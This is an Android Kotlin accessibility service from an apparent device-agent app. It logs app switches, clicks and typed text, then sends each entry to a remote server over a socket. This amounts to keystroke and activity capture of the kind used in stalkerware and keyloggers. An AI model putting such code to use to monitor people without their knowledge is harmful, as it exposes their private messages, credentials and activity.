package com.codewithdanu.deviceagent

import android.accessibilityservice.AccessibilityService
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import org.json.JSONObject

/**
 * Accessibility Service to monitor user activity on the device.
 * Captures app changes, button clicks, and text inputs.
 */
class ActivityMonitorService : AccessibilityService() {
    
    private var lastPackage: String? = null
    private var lastDetails: String? = null
    private val TAG = "ActivityMonitor"

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: return
        
        // Ignore our own agent app
        if (packageName == applicationContext.packageName) return

        val detail = when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                // Window changed (new app or activity)
                val appLabel = getAppName(packageName)
                if (packageName != lastPackage) {
                    lastPackage = packageName
                    "Switch to $appLabel ($packageName)"
                } else null
            }
            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                val text = event.text.joinToString(", ")
                val desc = event.contentDescription?.toString()
                if (text.isNotBlank()) "Clicked: $text"
                else if (!desc.isNullOrBlank()) "Clicked: $desc"
                else null
            }
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val text = event.text.joinToString(", ")
                if (text.isNotBlank() && text != lastDetails) {
                    lastDetails = text
                    "Input text: $text"
                } else null
            }
            else -> null
        }

        if (detail != null) {
            sendActivityLog(packageName, detail)
        }
    }

    private fun sendActivityLog(packageName: String, detail: String) {
        val deviceId = AgentConfig.getDeviceId(this)
        if (deviceId.isEmpty()) return

        val logEntry = JSONObject().apply {
            put("deviceId", deviceId as String)
            put("package_name", packageName as String)
            put("app_name", getAppName(packageName) as String)
            put("activity", detail as String)
            put("timestamp", System.currentTimeMillis())
        }

        Log.d(TAG, "[$packageName] $detail")
        
        // Emit via SocketManager
        if (SocketManager.isConnected()) {
            SocketManager.emit("agent:activity_log", logEntry)
        }
    }

    private fun getAppName(packageName: String): String {
        return try {
            val pm = packageManager
            val info = pm.getApplicationInfo(packageName, 0)
            pm.getApplicationLabel(info).toString()
        } catch (e: Exception) {
            packageName
        }
    }

    override fun onInterrupt() {
        Log.w(TAG, "Accessibility Service Interrupted")
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.i(TAG, "Activity Monitor Connected")
    }
}
